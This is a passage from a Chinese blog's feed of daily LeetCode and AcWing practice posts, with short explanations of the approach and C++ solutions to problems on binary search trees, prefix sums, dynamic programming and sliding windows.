<span class="hljs-keyword">return</span> rangeSumBST(root-&gt;right, low, high);<br>        <span class="hljs-keyword">return</span> root-&gt;val+rangeSumBST(root-&gt;left, low, high)+rangeSumBST(root-&gt;right, low, high);<br>    &#125;<br>&#125;;<br><br><br></code></pre></td></tr></table></figure><h2 id="AcWing-1589-构建二叉搜索树"><a href="#AcWing-1589-构建二叉搜索树" class="headerlink" title="AcWing 1589. 构建二叉搜索树"></a><a href="https://www.acwing.com/problem/content/1591/">AcWing 1589. 构建二叉搜索树</a></h2><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>先将所有节点（包括新加入的）排序后再按照层序遍历输出就可以得解<br>有两种写法，一种是把树&#x2F;队列用数组模拟出来即可，另外一种是把真正的树结构和队列结构都用起来</p><h4 id="C-代码1-模拟树-模拟队列法"><a href="#C-代码1-模拟树-模拟队列法" class="headerlink" title="C++代码1(模拟树+模拟队列法)"></a>C++代码1(模拟树+模拟队列法)</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">110</span>;<br><br><span class="hljs-type">int</span> n;<br><span class="hljs-type">int</span> w[N], l[N], r[N];<br><span class="hljs-type">int</span> a[N], q[N];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> u,<span class="hljs-type">int</span>&amp; k)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(u==<span class="hljs-number">-1</span>)   <span class="hljs-keyword">return</span>;<br>    dfs(l[u], k);<br>    w[u]=a[k++];<br>    dfs(r[u], k);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">bfs</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> hh=<span class="hljs-number">0</span>, tt=<span class="hljs-number">0</span>;<br>    q[<span class="hljs-number">0</span>]=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(hh&lt;=tt)<span class="hljs-comment">//队列不空</span><br>    &#123;<br>        <span class="hljs-type">int</span> t=q[hh++];<span class="hljs-comment">//取出队头</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, w[t]);<br>        <span class="hljs-keyword">if</span>(l[t]!=<span class="hljs-number">-1</span>)<span class="hljs-comment">//如果有左儿子</span><br>            q[++tt]=l[t];<br>        <span class="hljs-keyword">if</span>(r[t]!=<span class="hljs-number">-1</span>)<span class="hljs-comment">//如果有右儿子</span><br>            q[++tt]=r[t];<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;n);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d&quot;</span>, &amp;l[i], &amp;r[i]);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;a[i]);<br>    sort(a, a+n);<br>    <br>    <span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;<br>    dfs(<span class="hljs-number">0</span>, k);<br>    bfs();<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="C-代码2（树-队列法）"><a href="#C-代码2（树-队列法）" class="headerlink" title="C++代码2（树+队列法）"></a>C++代码2（树+队列法）</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TreeNode</span>&#123;</span>    <span class="hljs-comment">//建立数据结构</span><br>    <span class="hljs-type">int</span> val;<br>    <span class="hljs-type">int</span> left;<br>    <span class="hljs-type">int</span> right;<br>&#125;root[<span class="hljs-number">110</span>]; <span class="hljs-comment">//节点数组</span><br><span class="hljs-type">int</span> n,co;<br><span class="hljs-type">int</span> num[<span class="hljs-number">110</span>];<br><span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; ans;<br><span class="hljs-type">void</span> <span class="hljs-title function_">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> u)</span>     <span class="hljs-comment">//中序遍历把值赋给root[].val</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(u==<span class="hljs-number">-1</span>) <span class="hljs-keyword">return</span> ;<br><br>    dfs(root[u].left);<br>    root[u].val=num[co++];<br>    dfs(root[u].right);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">bfs</span><span class="hljs-params">()</span>      <span class="hljs-comment">//层序遍历存储答案输出的值的顺序</span><br>&#123;<br>    <span class="hljs-built_in">queue</span>&lt;TreeNode&gt; q;<br>    q.push(root[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-keyword">while</span>(q.size())<br>    &#123;<br>        <span class="hljs-keyword">auto</span> t = q.front();<br>        q.pop();<br><br>        ans.push_back(t.val);<br>        <span class="hljs-keyword">if</span>(t.left!=<span class="hljs-number">-1</span>)  q.push(root[t.left]);<br>        <span class="hljs-keyword">if</span>(t.right!=<span class="hljs-number">-1</span>)  q.push(root[t.right]);<br>    &#125;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">cin</span>&gt;&gt;n;<br>    <span class="hljs-type">int</span> l,r;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-built_in">cin</span>&gt;&gt;l&gt;&gt;r;<br>        root[i].left=l;<br>        root[i].right=r;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++) <span class="hljs-built_in">cin</span>&gt;&gt;num[i];<br><br>    sort(num,num+n);    <span class="hljs-comment">//将输入的数组元素从小到大排列，用来匹配二叉搜索树的赋值情况</span><br>    dfs(<span class="hljs-number">0</span>);<br>    bfs();<br><br>    <span class="hljs-type">int</span> f=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> x:ans)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(f) <span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>        <span class="hljs-built_in">cout</span>&lt;&lt;x;<br>        f=<span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> acwing </tag>
            
            <tag> leetcode </tag>
            
            <tag> 每日一题 </tag>
            
            <tag> 树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【每日一题】LeetCode 363.矩形区域不超过K的最大数值和</title>
      <link href="/2021/04/95003eb.html"/>
      <url>/2021/04/95003eb.html</url>
      
        <content type="html"><![CDATA[<h2 id="LeetCode-363-矩形区域不超过K的最大数值和"><a href="#LeetCode-363-矩形区域不超过K的最大数值和" class="headerlink" title="LeetCode 363. 矩形区域不超过K的最大数值和"></a><a href="https://leetcode-cn.com/problems/max-sum-of-rectangle-no-larger-than-k/">LeetCode 363. 矩形区域不超过K的最大数值和</a></h2><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>将问题转化为一维上的问题，枚举<code>lo</code>和<code>hi</code>表示当前处理数据的列区间，对于每一个列区间，可以看做一个一维问题。<br>一维问题可以用前缀和配合二分的方式在 <code>O(mlog⁡m)</code> 的时间解决。维护一个有序集合，集合中初始放入 0。每次获取当前位置的前缀和，在集合中二分查找第一个大于等于 <code>sum - k</code> 的数字，如果能找到，则更新答案。然后将当前位置的前缀和放入有序集合中。<br>由此推出的列区间共有n^2个。每个一维问题解决时间为<code>O(mlogm)</code>，故总时间复杂度为<code>O(n^2mlog(m))</code></p><h4 id="C-代码"><a href="#C-代码" class="headerlink" title="C++代码"></a>C++代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; s;<br><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-type">int</span> x1,<span class="hljs-type">int</span> y1,<span class="hljs-type">int</span> x2,<span class="hljs-type">int</span> y2)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> s[x2][y2]-s[x1<span class="hljs-number">-1</span>][y2]-s[x2][y1<span class="hljs-number">-1</span>]+s[x1<span class="hljs-number">-1</span>][y1<span class="hljs-number">-1</span>];<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">maxSumSubmatrix</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; matrix, <span class="hljs-type">int</span> k)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n=matrix.<span class="hljs-built_in">size</span>(), m=matrix[<span class="hljs-number">0</span>].<span class="hljs-built_in">size</span>();<br>        s=vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;(n+<span class="hljs-number">1</span>, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(m+<span class="hljs-number">1</span>));<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=m;j++)<br>                s[i][j]=s[i<span class="hljs-number">-1</span>][j]+s[i][j<span class="hljs-number">-1</span>]-s[i<span class="hljs-number">-1</span>][j<span class="hljs-number">-1</span>]+matrix[i<span class="hljs-number">-1</span>][j<span class="hljs-number">-1</span>];<br>        <span class="hljs-type">int</span> res=INT_MIN;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=m;i++)<br>        &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=i;j&lt;=m;j++)<br>            &#123;<br>                set&lt;<span class="hljs-type">int</span>&gt; S;<br>                S.<span class="hljs-built_in">insert</span>(<span class="hljs-number">0</span>);<br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> p=<span class="hljs-number">1</span>;p&lt;=n;p++)<br>                &#123;<br>                    <span class="hljs-type">int</span> si=<span class="hljs-built_in">get</span>(<span class="hljs-number">1</span>,i,p,j);<br>                    <span class="hljs-keyword">auto</span> it=S.<span class="hljs-built_in">lower_bound</span>(si-k);<br>                    <span class="hljs-keyword">if</span>(it!=S.<span class="hljs-built_in">end</span>()) res=<span class="hljs-built_in">max</span>(res, si-*it);<br>                    S.<span class="hljs-built_in">insert</span>(si);<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="AcWing-3412-邻域均值"><a href="#AcWing-3412-邻域均值" class="headerlink" title="AcWing 3412.邻域均值"></a><a href="https://www.acwing.com/problem/content/3415/">AcWing 3412.邻域均值</a></h2><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>使用前缀和，得出最后的<code>s[N][N]</code>然后进行计算，后面主要返回整体的平均值即可，每次都选出最适合的区域并保存。</p><h4 id="C-代码-1"><a href="#C-代码-1" class="headerlink" title="C++代码"></a>C++代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">610</span>;<br><br><span class="hljs-type">int</span> n,L,r,t;<br><span class="hljs-type">int</span> s[N][N];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">get_sum</span><span class="hljs-params">(<span class="hljs-type">int</span> x1,<span class="hljs-type">int</span> y1,<span class="hljs-type">int</span> x2,<span class="hljs-type">int</span> y2)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> s[x2][y2]-s[x1<span class="hljs-number">-1</span>][y2]-s[x2][y1<span class="hljs-number">-1</span>]+s[x1<span class="hljs-number">-1</span>][y1<span class="hljs-number">-1</span>];<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">get_cnt</span><span class="hljs-params">(<span class="hljs-type">int</span> x1,<span class="hljs-type">int</span> y1,<span class="hljs-type">int</span> x2,<span class="hljs-type">int</span> y2)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> (x2-x1+<span class="hljs-number">1</span>)*(y2-y1+<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    cin&gt;&gt;n&gt;&gt;L&gt;&gt;r&gt;&gt;t;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=n;j++)<br>        &#123;<br>            <span class="hljs-type">int</span> x;<br>            cin&gt;&gt;x;<br>            s[i][j]=s[i<span class="hljs-number">-1</span>][j]+s[i][j<span class="hljs-number">-1</span>]-s[i<span class="hljs-number">-1</span>][j<span class="hljs-number">-1</span>]+x;<br>        &#125;<br>    <span class="hljs-type">int</span> res=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=n;j++)<br>        &#123;<br>            <span class="hljs-type">int</span> x1=<span class="hljs-built_in">max</span>(<span class="hljs-number">1</span>, i-r), y1=<span class="hljs-built_in">max</span>(<span class="hljs-number">1</span>, j-r);<br>            <span class="hljs-type">int</span> x2=<span class="hljs-built_in">min</span>(n, i+r), y2=<span class="hljs-built_in">min</span>(n, j+r);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-built_in">get_sum</span>(x1,y1,x2,y2)&lt;=t * <span class="hljs-built_in">get_cnt</span>(x1,y1,x2,y2))<br>                res++;<br>        &#125;<br>    cout&lt;&lt;res&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> acwing </tag>
            
            <tag> 算法 </tag>
            
            <tag> leetcode </tag>
            
            <tag> 每日一题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【每日一题】LeetCode 91.解码方法</title>
      <link href="/2021/04/d73dd87b.html"/>
      <url>/2021/04/d73dd87b.html</url>
      
        <content type="html"><![CDATA[<h2 id="断更说明"><a href="#断更说明" class="headerlink" title="断更说明"></a>断更说明</h2><p>前两天停止更新了两天，不是因为我放弃挣扎了，而是后面几天的每日一题都被预判了。。。在之前的文章（推送）里面都可以找到，今天题目恢复正常，每日一题也开始正常更新</p><p>之后可能会把几天的每日一题汇总起来一次发推送，提高每篇文章的丰富度，如果有任何好的建议，欢迎给我留言。</p><h2 id="LeetCode-91-解码方法"><a href="#LeetCode-91-解码方法" class="headerlink" title="LeetCode 91. 解码方法"></a><a href="https://leetcode-cn.com/problems/decode-ways/">LeetCode 91. 解码方法</a></h2><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>本题的大致意思是要将一段编码后的字符串解码，而按照对应的转换关系，编码后的数字会有很多种不同的划分方式对应着不同的解码方式，这里就需要用到动规的思想，先判断当前如果是1-9即可算一种排列方式，接着再判断当前数和前一个数字组合以后能够组成一个10-26之间的数（与字母对应）即可认为也存在一种情况，直接加上这种情况即可。</p><h4 id="C-代码"><a href="#C-代码" class="headerlink" title="C++代码"></a>C++代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">numDecodings</span><span class="hljs-params">(string s)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n=s.<span class="hljs-built_in">size</span>();<br>        s=<span class="hljs-string">&#x27; &#x27;</span>+s;<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">f</span><span class="hljs-params">(n+<span class="hljs-number">1</span>)</span></span>;<br>        f[<span class="hljs-number">0</span>]=<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(s[i]&gt;=<span class="hljs-string">&#x27;1&#x27;</span> &amp;&amp; s[i]&lt;=<span class="hljs-string">&#x27;9&#x27;</span>)  f[i]+=f[i<span class="hljs-number">-1</span>];<br>            <span class="hljs-keyword">if</span>(i&gt;<span class="hljs-number">1</span>)<br>            &#123;<br>                <span class="hljs-type">int</span> t=(s[i<span class="hljs-number">-1</span>]-<span class="hljs-string">&#x27;0&#x27;</span>) * <span class="hljs-number">10</span> + s[i] - <span class="hljs-string">&#x27;0&#x27;</span>;<br>                <span class="hljs-keyword">if</span>(t&gt;=<span class="hljs-number">10</span> &amp;&amp; t&lt;=<span class="hljs-number">26</span>)<br>                    f[i]+=f[i<span class="hljs-number">-2</span>];<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> f[n];<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="AcWing-821-跳台阶"><a href="#AcWing-821-跳台阶" class="headerlink" title="AcWing 821.跳台阶"></a><a href="https://www.acwing.com/problem/content/823/">AcWing 821.跳台阶</a></h2><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>一道基本的动规题目，斐波那契的应用</p><h4 id="C-代码-1"><a href="#C-代码-1" class="headerlink" title="C++代码"></a>C++代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">20</span>;<br><br><span class="hljs-type">int</span> n;<br><span class="hljs-type">int</span> f[N];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    cin&gt;&gt;n;<br>    f[<span class="hljs-number">0</span>]=<span class="hljs-number">1</span>, f[<span class="hljs-number">1</span>]=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">2</span>;i&lt;=n;i++)<br>        f[i]=f[i<span class="hljs-number">-1</span>]+f[i<span class="hljs-number">-2</span>];<br>    cout&lt;&lt;f[n]&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> acwing </tag>
            
            <tag> 算法 </tag>
            
            <tag> leetcode </tag>
            
            <tag> 每日一题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【每日一题】周末问题合并帖</title>
      <link href="/2021/04/455ad351.html"/>
      <url>/2021/04/455ad351.html</url>
      
        <content type="html"><![CDATA[<h2 id="【周六】LeetCode-220-存在重复元素-III"><a href="#【周六】LeetCode-220-存在重复元素-III" class="headerlink" title="【周六】LeetCode 220. 存在重复元素 III"></a>【周六】<a href="https://leetcode-cn.com/problems/contains-duplicate-iii/">LeetCode 220. 存在重复元素 III</a></h2><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>这题请教了一下学长，确定就是一个滑动窗口的延伸，也是动态的查询一个区间，每次都判断区间边界一边的点是否符合，如果不符合，再看看边界另一边的点是否符合，如果两者有一个符合，则可以直接返回true，否则的话就继续向下寻找，直到找出符合条件的值即可</p><h4 id="C-代码"><a href="#C-代码" class="headerlink" title="C++代码"></a>C++代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">containsNearbyAlmostDuplicate</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> k, <span class="hljs-type">int</span> t)</span> </span>&#123;<br>        <span class="hljs-keyword">typedef</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> ll;<br>        multiset&lt;ll&gt; s;<br>        s.<span class="hljs-built_in">insert</span>(<span class="hljs-number">1e18</span>); s.<span class="hljs-built_in">insert</span>(<span class="hljs-number">-1e18</span>);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>,j=<span class="hljs-number">0</span>;i&lt;nums.<span class="hljs-built_in">size</span>();i++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(i-j&gt;k)   s.<span class="hljs-built_in">erase</span>(s.<span class="hljs-built_in">find</span>(nums[j++]));<br>            <span class="hljs-type">int</span> x=nums[i];<br>            <span class="hljs-keyword">auto</span> it =s.<span class="hljs-built_in">lower_bound</span>(x);<br>            <span class="hljs-keyword">if</span>(*it -x&lt;=t)   <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            --it;<br>            <span class="hljs-keyword">if</span>(x-*it&lt;=t)    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            s.<span class="hljs-built_in">insert</span>(x);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="【周日】LeetCode-26-删除有序数组中的重复项"><a href="#【周日】LeetCode-26-删除有序数组中的重复项" class="headerlink" title="【周日】LeetCode 26. 删除有序数组中的重复项"></a>【周日】<a href="https://leetcode-cn.com/problems/remove-duplicates-from-sorted-array/">LeetCode 26. 删除有序数组中的重复项</a></h2><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>这题是个纯模拟题，直接暴力枚举判定出来把符合条件的数存进一个新的数组（空间换时间）即可</p><h4 id="C-代码-1"><a href="#C-代码-1" 